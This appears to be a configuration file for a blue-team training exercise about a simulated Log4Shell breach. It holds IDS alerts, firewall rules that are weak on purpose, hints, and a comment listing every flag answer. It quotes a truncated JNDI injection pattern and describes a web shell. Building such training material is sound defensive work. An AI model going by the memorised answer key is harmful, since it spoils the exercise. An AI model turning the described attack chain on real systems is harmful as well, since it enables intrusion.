    // IDS PANEL DATA (BlueTeam.js IDSPanel device)
    //
    // Suricata fast.log-style alerts. The key alert for Phase 1
    // is the Log4Shell JNDI string detection -- it names the CVE.
    // =========================================================

    ids: {
        alerts: [
            {
                sid:       'VF-IDS-9001',
                signature: 'ET SCAN Nmap Port Scan SYN Sweep',
                severity:  'medium',
                timestamp: '2026-05-08 07:02:01',
                srcIP:     '203.0.113.66',
                dstIP:     '10.10.10.20',
                dstPort:   80,
                detail:    'Multiple rapid SYN packets from 203.0.113.66 targeting WEB-DMZ-01 across a broad port range. Pattern consistent with Nmap default TCP SYN scan (-sS). Pre-attack reconnaissance. No direct action needed but source IP should be monitored.',
                correctClassification: 'tp',
                mitre:     'T1046'
            },
            {
                // *** THE KEY PHASE 1 ALERT ***
                // entry_cve discoverable from this alert detail.
                // The attacker_ip also confirmed here.
                sid:       'VF-IDS-9002',
                signature: 'ET EXPLOIT Apache Log4j RCE Attempt CVE-2021-44228 (JNDI Injection)',
                severity:  'critical',
                timestamp: '2026-05-08 07:08:14',
                srcIP:     '203.0.113.66',
                dstIP:     '10.10.10.20',
                dstPort:   80,
                detail:    'Suricata SID matched: JNDI expression detected in inbound HTTP User-Agent header from 203.0.113.66. Pattern: ${jndi:ldap://...}. This is the Log4Shell remote code execution exploit targeting CVE-2021-44228 (CVSS 10.0). Affects Apache Log4j versions 2.0-beta9 through 2.14.1. Immediate impact: the Java application on WEB-DMZ-01 will initiate an outbound LDAP connection to the attacker-controlled host, loading a remote class that gives the attacker RCE as the application service account.',
                correctClassification: 'tp',
                mitre:     'T1190'
            },
            {
                sid:       'VF-IDS-9003',
                signature: 'ET MALWARE JNDI LDAP Callback to External Host (Log4Shell Post-Exploit)',
                severity:  'critical',
                timestamp: '2026-05-08 07:08:14',
                srcIP:     '10.10.10.20',
                dstIP:     '203.0.113.66',
                dstPort:   null,
                detail:    'Outbound LDAP connection from WEB-DMZ-01 (10.10.10.20) to external attacker address 203.0.113.66 on a non-standard LDAP port. This is the post-exploitation callback triggered by the Log4j JNDI lookup. The remote LDAP server delivers a malicious Java class that executes on the victim JVM. Root cause: no egress filtering on the DMZ blocked this outbound LDAP callback. Identify the exact port from the firewall log -- it is the egress rule the DMZ was missing.',
                correctClassification: 'tp',
                mitre:     'T1071.004'
            },
            {
                sid:       'VF-IDS-9004',
                signature: 'ET WEB_SERVER JSP Web Shell Upload and Execution',
                severity:  'critical',
                timestamp: '2026-05-08 07:08:41',
                srcIP:     '203.0.113.66',
                dstIP:     '10.10.10.20',
                dstPort:   80,
                detail:    'File upload to Java web application by attacker IP 203.0.113.66 immediately followed by HTTP GET request to the uploaded file with a command execution parameter (cmd=). This is the classic web shell deploy-and-execute pattern. The uploaded file status.jsp is now executing OS commands as the application service user on WEB-DMZ-01.',
                correctClassification: 'tp',
                mitre:     'T1505.003'
            },
            {
                sid:       'VF-IDS-9005',
                signature: 'ET POLICY Internal Host Initiating SSH to Internal RFC1918 Target',
                severity:  'high',
                timestamp: '2026-05-08 07:43:11',
                srcIP:     '10.10.10.20',
                dstIP:     '10.10.20.0/24',
                dstPort:   22,
                detail:    'WEB-DMZ-01 (10.10.10.20) initiated an SSH connection to an internal host on the 10.10.20.0/24 application subnet. DMZ application servers have no authorized need to initiate SSH connections to internal hosts. Consistent with lateral movement via a compromised service account that has SSH key access to internal targets. Identify the exact destination IP from auth.log and the firewall FORWARD entries.',
                correctClassification: 'tp',
                mitre:     'T1021.004'
            },
            {
                sid:       'VF-IDS-9006',
                signature: 'ET MALWARE Data Exfiltration -- Large Outbound HTTPS Transfer to Non-Approved External IP',
                severity:  'critical',
                timestamp: '2026-05-08 08:14:22',
                srcIP:     '10.10.20.0/24',
                dstIP:     '203.0.113.66',
                dstPort:   443,
                detail:    'Anomalous high-volume outbound HTTPS transfer from an internal host on the 10.10.20.0/24 subnet to external attacker IP 203.0.113.66 -- the same address that conducted the initial Log4Shell exploit. The internal application subnet hosts Finance-tier servers holding customer PII. This transfer represents confirmed data exfiltration. Identify the exact source host and byte count from the firewall FORWARD log entries.',
                correctClassification: 'tp',
                mitre:     'T1041'
            }
        ]
    },

    // =========================================================
    // FIREWALL MANAGER DATA (BlueTeam.js FirewallManager device)
    //
    // Current rules are intentionally deficient:
    //   - OUTPUT allows all traffic from DMZ -- no egress filtering.
    //   - No block on outbound LDAP (port 1389) from DMZ hosts.
    //   - FORWARD allows DMZ to internal subnet (no east-west filtering).
    //   - No block on outbound connections from internal hosts to external IPs.
    //
    // The student can read these rules, see the gap (no egress block on
    // non-web ports from DMZ), and connect it to the c2_port flag:
    // a rule blocking DPT=1389 outbound from DMZ would have stopped
    // the Log4Shell LDAP callback and broken the kill chain at step 2.
    // =========================================================

    firewall: {
        rules: [
            // Inbound: allow web traffic to DMZ
            { chain: 'INPUT',   src: '0.0.0.0/0',       dst: '10.10.10.0/24', port: '80',   protocol: 'tcp', action: 'ACCEPT' },
            { chain: 'INPUT',   src: '0.0.0.0/0',       dst: '10.10.10.0/24', port: '443',  protocol: 'tcp', action: 'ACCEPT' },
            // Inbound: allow SSH from internal jump host only
            { chain: 'INPUT',   src: '10.10.1.5/32',    dst: '10.10.10.0/24', port: '22',   protocol: 'tcp', action: 'ACCEPT' },
            // Output: MISSING EGRESS CONTROL -- DMZ hosts can reach any external IP on any port
            // A rule "OUTPUT src=10.10.10.0/24 dst=0.0.0.0/0 port=1389 DENY" would have blocked
            // the Log4Shell LDAP callback and prevented RCE from completing.
            { chain: 'OUTPUT',  src: '10.10.10.0/24',   dst: '0.0.0.0/0',    port: 'any',  protocol: 'any', action: 'ACCEPT' },
            // Forward: DMZ to internal -- no east-west restriction
            { chain: 'FORWARD', src: '10.10.10.0/24',   dst: '10.10.20.0/24', port: 'any',  protocol: 'any', action: 'ACCEPT' },
            // Forward: internal to external -- no restriction on internal hosts reaching external IPs
            { chain: 'FORWARD', src: '10.10.20.0/24',   dst: '0.0.0.0/0',    port: 'any',  protocol: 'any', action: 'ACCEPT' },
            // Default drop (last rule -- but OUTPUT ACCEPT above lets the callback through first)
            { chain: 'INPUT',   src: '0.0.0.0/0',       dst: '0.0.0.0/0',    port: 'any',  protocol: 'any', action: 'DROP'   }
        ]
    },

    // =========================================================
    // FLAGS
    //
    // Seven flags, phased. Values are embedded ONLY in the
    // device data and log evidence -- never in lore, hints 1-2,
    // case.txt, notes.txt, or any desktop app header text.
    //
    // APP-INT-05 IP (10.10.20.15) and exfil bytes (4509715660)
    // are NOT pre-stated anywhere outside the log evidence.
    //
    // FIRESTORE SEEDING (flag_registry/shield-sp-blueteam-breach-capstone):
    //   attacker_ip        -> 203.0.113.66
    //   entry_cve          -> CVE-2021-44228
    //   webshell_path      -> /var/www/app/uploads/status.jsp
    //   compromised_account -> svc-deploy
    //   lateral_target     -> 10.10.20.15
    //   exfil_bytes        -> 4509715660
    //   c2_port            -> 1389
    // =========================================================

    flags: [
        // ── Phase 1: DETECT ──────────────────────────────────
        {
            id:          'attacker_ip',
            points:      100,
            label:       'Attacker External IP Address',
            description: 'The external IP address conducting the attack. Found in monitoring alerts, IDS alerts, the Apache access log, and the firewall log. Submit the raw IP in dotted-decimal notation.'
        },
        {
            id:          'entry_cve',
            points:      150,
            label:       'Exploit CVE Identifier',
            description: 'The CVE number of the vulnerability exploited to gain initial remote code execution. Discoverable from the IDS alert detail and the application log4j.log. Submit the exact CVE string including the CVE prefix.'
        },

        // ── Phase 2: INVESTIGATE ─────────────────────────────
        {
            id:          'webshell_path',
            points:      150,
            label:       'Web Shell Filesystem Path',
            description: 'The full server-side filesystem path where the web shell was stored after upload. Discoverable from the Apache error log (upload handler notice) and the application log. Submit the full absolute path.'
        },
        {
            id:          'compromised_account',
            points:      150,
            label:       'Compromised Service Account',
            description: 'The service account whose credentials the attacker used to perform lateral movement. The account has authorized SSH access to internal hosts. Discoverable from auth.log. Submit the username only.'
        },
        {
            id:          'lateral_target',
            points:      150,
            label:       'Lateral Movement Target IP',
            description: 'The IP address of the internal host the attacker pivoted to after gaining access to WEB-DMZ-01. This host is NOT identified in the case file. Discover it from auth.log and the firewall FORWARD entries. Submit the raw IP.'
        },

        // ── Phase 3: CONTAIN ─────────────────────────────────
        {
            id:          'exfil_bytes',
            points:      250,
            label:       'Exfiltration Byte Count',
            description: 'The exact BYTES field value in the firewall log for the outbound exfiltration flow from the internal compromised host to the attacker IP. Submit the raw integer -- no commas, no units.'
        },
        {
            id:          'c2_port',
            points:      200,
            label:       'Log4Shell LDAP Callback Port',
            description: 'The TCP port number used by the Log4Shell JNDI payload for its outbound LDAP callback to the attacker. This is also the specific port that an egress firewall rule on the DMZ would have blocked to stop the attack. Discoverable from the firewall log and the application log. Submit the port number only.'
        }
    ],

    // =========================================================
    // SCORING
    //
    // Capstone gets higher total than a normal box.
    // Max flag points: 100+150+150+150+150+250+200 = 1150
    // maxScore is 1150 (sum of all flag points).
    // base: 1150 sets the starting score.
    // =========================================================

    scoring: {
        base:              1150,
        minScore:          0,
        maxScore:          1150,
        hintPenalty:       true,
        wrongFlagPenalty:  -25,
        speedBonus:        { threshold: 2400000, points: 150 },
        timeBonusThreshold: 3600
    },

    // =========================================================
    // HINTS
    //
    // Progressive: hint 1 gives investigation strategy,
    // hint 2 gives an exact command to run, hint 3 reveals
    // via {{FLAG:id}} (only the final hint per flag uses this).
    // No neutral grep examples may contain actual flag values.
    // =========================================================

    hints: [

        // ── attacker_ip ──────────────────────────────────────
        {
            id:      'hint_atk_ip_1',
            flagId:  'attacker_ip',
            text:    'Start with the Monitoring dashboard and IDS Panel -- both fire critical alerts before the logs tell the full story. The attacking IP is an external RFC5737 documentation-range address (203.0.113.0/24). It appears as the source in every recon, exploit, and web shell request.',
            cost:    25,
            penalty: -25
        },
        {
            id:      'hint_atk_ip_2',
            flagId:  'attacker_ip',
            text:    'Run: grep "203.0.113" /var/log/apache2/access.log\n\nEvery request from the attacker will be in this subnet. The same IP is the source in the IDS alert for the Log4Shell attempt and in the firewall outbound LDAP callback line. Pick any of those three sources -- they all show the same address.',
            cost:    50,
            penalty: -50
        },
        {
            id:      'hint_atk_ip_3',
            flagId:  'attacker_ip',
            text:    'The attacker IP is in the RFC5737 203.0.113.0/24 documentation range. It appears as SRC in the recon port-scan firewall entries, as the request source in the Apache access log, and as the destination in the IDS Log4Shell alert.\n\nThe value to submit: {{FLAG:attacker_ip}}',
            cost:    75,
            penalty: -75
        },

        // ── entry_cve ────────────────────────────────────────
        {
            id:      'hint_cve_1',
            flagId:  'entry_cve',
            text:    'The exploit CVE is named in two places: the IDS alert detail for the JNDI injection attempt, and the Java application log (log4j.log). Look at the application log first -- Log4j itself logs a warning when it detects a JNDI expression, and the log line includes the CVE reference.',
            cost:    25,
            penalty: -25
        },
        {
            id:      'hint_cve_2',
            flagId:  'entry_cve',
            text:    'Run: grep "CVE" /var/log/app/log4j.log\n\nThe application log lines from the JNDI lookup handler include the CVE identifier in the message. Also check the IDS panel -- the Log4Shell alert names the CVE in the signature title. Submit the full CVE identifier including the CVE prefix.',
            cost:    50,
            penalty: -50
        },
        {
            id:      'hint_cve_3',
            flagId:  'entry_cve',
            text:    'This is the Log4Shell vulnerability -- the most severe Java library RCE in recent history. The CVE is in the 2021 series, score 10.0. The exact identifier appears in the log4j.log JNDI lookup ERROR line.\n\nThe value to submit: {{FLAG:entry_cve}}',
            cost:    75,
            penalty: -75
        },

        // ── webshell_path ────────────────────────────────────
        {
            id:      'hint_shell_1',
            flagId:  'webshell_path',
            text:    'After gaining RCE via Log4Shell, the attacker uploaded a JSP web shell through the application upload endpoint. The Apache access log shows the POST that uploaded it, and the Apache error log records where the server stored the file. The error log\'s upload handler notice contains the full server-side filesystem path.',
            cost:    25,
            penalty: -25
        },
        {
            id:      'hint_shell_2',
            flagId:  'webshell_path',
            text:    'Run: grep "stored as" /var/log/apache2/error.log\n\nThe JSP notice from the upload handler records the full filesystem path where the file was written. That full path is the flag. Also run: grep "status.jsp" /var/log/apache2/access.log -- that shows the URL path the attacker used to execute it (which is different from the server-side storage path).',
            cost:    50,
            penalty: -50
        },
        {
            id:      'hint_shell_3',
            flagId:  'webshell_path',
            text:    'The web shell is a JSP file in the uploads directory under the application web root. The Apache error log\'s upload handler notice says exactly where it was stored.\n\nThe value to submit: {{FLAG:webshell_path}}',
            cost:    75,
            penalty: -75
        },

        // ── compromised_account ───────────────────────────────
        {
            id:      'hint_acct_1',
            flagId:  'compromised_account',
            text:    'The attacker used the web shell to read SSH keys from a service account\'s home directory, then used that key to SSH locally on WEB-DMZ-01 and then to pivot to the internal host. Look for a service account in auth.log that has an anomalous SSH login -- specifically a login from the loopback address (127.0.0.1), which is how web-shell-initiated SSH appears.',
            cost:    25,
            penalty: -25
        },
        {
            id:      'hint_acct_2',
            flagId:  'compromised_account',
            text:    'Run: grep "127.0.0.1" /var/log/auth.log\n\nA legitimate user never SSH-es from the loopback address. When an SSH login shows "from 127.0.0.1", it means a process on the local host opened the connection -- in this case the web shell. The account name in that Accepted line is the compromised service account.',
            cost:    50,
            penalty: -50
        },
        {
            id:      'hint_acct_3',
            flagId:  'compromised_account',
            text:    'The compromised service account handles deployment automation and has SSH key access to multiple internal hosts -- that is why it was valuable to the attacker. Its name follows the svc- naming convention for service accounts.\n\nThe value to submit: {{FLAG:compromised_account}}',
            cost:    75,
            penalty: -75
        },

        // ── lateral_target ────────────────────────────────────
        {
            id:      'hint_lat_1',
            flagId:  'lateral_target',
            text:    'The internal host\'s IP is NOT given in the case file or any briefing. You must discover it from the logs. Look in auth.log for an SSH login event where the source IP is WEB-DMZ-01 (10.10.10.20) and the destination host is APP-INT-05 -- that sshd line reveals the destination hostname or you can cross-reference the firewall FORWARD entries.',
            cost:    25,
            penalty: -25
        },
        {
            id:      'hint_lat_2',
            flagId:  'lateral_target',
            text:    'Run: grep "10.10.20" /var/log/firewall.log\n\nThe firewall FORWARD rule for the lateral SSH shows both SRC (WEB-DMZ-01) and DST (APP-INT-05). The DST IP on the FORWARD entry to port 22 is the lateral target. Also try: grep "Accepted" /var/log/auth.log and look for a source of 10.10.10.20 -- that sshd record on APP-INT-05 names the destination context.',
            cost:    50,
            penalty: -50
        },
        {
            id:      'hint_lat_3',
            flagId:  'lateral_target',
            text:    'The lateral target is on the 10.10.20.0/24 internal application subnet. The firewall FORWARD entry and the auth.log entry from APP-INT-05 both show this address as the destination of the SSH from WEB-DMZ-01.\n\nThe value to submit: {{FLAG:lateral_target}}',
            cost:    75,
            penalty: -75
        },

        // ── exfil_bytes ───────────────────────────────────────
        {
            id:      'hint_exfil_1',
            flagId:  'exfil_bytes',
            text:    'The exfiltration happened from the internal host (APP-INT-05) outbound to the attacker IP over HTTPS/443. The firewall log records a BYTES= field for this flow -- that is the total bytes in the exfil transfer, not per-packet. Look for the largest BYTES value in the firewall log on an ALLOW OUT line to the attacker IP.',
            cost:    25,
            penalty: -25
        },
        {
            id:      'hint_exfil_2',
            flagId:  'exfil_bytes',
            text:    'Run: grep "BYTES=" /var/log/firewall.log\n\nThen look for the entry with a destination of 203.0.113.66 (the attacker) on port 443. The BYTES= value on that line is the total data transferred. It is a large number -- multiple gigabytes. Submit the exact raw integer with no formatting.',
            cost:    50,
            penalty: -50
        },
        {
            id:      'hint_exfil_3',
            flagId:  'exfil_bytes',
            text:    'The exfiltration flow transferred approximately 4.2 GB of customer PII. The BYTES field in the firewall log shows the exact byte count as a raw integer. Submit only that number -- no commas, no units.\n\nThe value to submit: {{FLAG:exfil_bytes}}',
            cost:    75,
            penalty: -75
        },

        // ── c2_port ───────────────────────────────────────────
        {
            id:      'hint_c2port_1',
            flagId:  'c2_port',
            text:    'When Log4Shell fires, the Java process makes an outbound LDAP connection to the attacker-controlled server. The port used for that callback is specified in the JNDI string inside the exploit payload. Look at the firewall log and the application log for outbound traffic from WEB-DMZ-01 to the attacker IP on a non-web port.',
            cost:    25,
            penalty: -25
        },
        {
            id:      'hint_c2port_2',
            flagId:  'c2_port',
            text:    'Run: grep "DPT=" /var/log/firewall.log\n\nFind the ALLOW OUT entry where SRC=10.10.10.20 and DST=203.0.113.66 -- that is the outbound LDAP callback. The DPT= field on that line is the port the attacker configured for the JNDI callback. Attackers often shift off standard LDAP port 389 to avoid naive detection rules. Also check: grep "ldap" /var/log/app/log4j.log for the JNDI URL in the application log.',
            cost:    50,
            penalty: -50
        },
        {
            id:      'hint_c2port_3',
            flagId:  'c2_port',
            text:    'The Log4Shell JNDI payload string contained the LDAP callback port in the URL: ldap://203.0.113.66:PORT/a. The firewall\'s ALLOW OUT entry for that outbound connection shows DPT= equal to that port number. The missing egress rule that would have stopped this attack is: deny outbound TCP from 10.10.10.0/24 to any on this port.\n\nThe value to submit: {{FLAG:c2_port}}',
            cost:    75,
            penalty: -75
        }

    ],

    // =========================================================
    // CERT OBJECTIVES
    //
    // certObjectives.mappings -- flat array under certObjectives.
    // Each flag maps to a SY0-701 Domain 4 objective.
    // =========================================================

    certObjectives: {
        certPath: 'CompTIA Security+ SY0-701',
        mappings: [
            {
                flagId:      'attacker_ip',
                objective:   '4.3',
                description: 'Explain various types of vulnerabilities -- analyzing network threat indicators',
                skill:       'Identifying attacker IP from monitoring dashboard, IDS, and log correlation'
            },
            {
                flagId:      'entry_cve',
                objective:   '4.3',
                description: 'Explain various types of vulnerabilities -- application vulnerability identification',
                skill:       'Identifying CVE-2021-44228 (Log4Shell) from IDS alerts and application log JNDI evidence'
            },
            {
                flagId:      'webshell_path',
                objective:   '4.8',
                description: 'Explain appropriate incident response activities -- evidence collection and analysis',
                skill:       'Locating web shell filesystem path via Apache error log upload handler notice'
            },
            {
                flagId:      'compromised_account',
                objective:   '4.4',
                description: 'Explain security alerting and monitoring concepts -- anomalous authentication detection',
                skill:       'Detecting compromised service account via anomalous loopback-source SSH login in auth.log'
            },
            {
                flagId:      'lateral_target',
                objective:   '4.4',
                description: 'Explain security alerting and monitoring concepts -- lateral movement identification',
                skill:       'Discovering lateral movement target IP from firewall FORWARD entries and auth.log correlation'
            },
            {
                flagId:      'exfil_bytes',
                objective:   '4.8',
                description: 'Explain appropriate incident response activities -- data loss scoping and quantification',
                skill:       'Quantifying exfiltration volume from firewall flow log BYTES field'
            },
            {
                flagId:      'c2_port',
                objective:   '4.8',
                description: 'Explain appropriate incident response activities -- containment and lessons learned',
                skill:       'Identifying the missing egress control via Log4Shell LDAP callback port analysis'
            }
        ]
    },

    // =========================================================
    // STATE RESET (BOX-006 pattern -- idempotent on script load)
    // =========================================================

    resetState: function() {
        // No internal _state needed for a pure find-and-submit box.
        // BoxEngine manages flag submission state and phase progression
        // in Firestore.
    }

};

// Auto-reset on load (BOX-006 backfill 2026-05-23)
// Use window.VSBCConfig -- the bare name is not in scope after the window= assignment.
if (window.VSBCConfig) window.VSBCConfig.resetState();
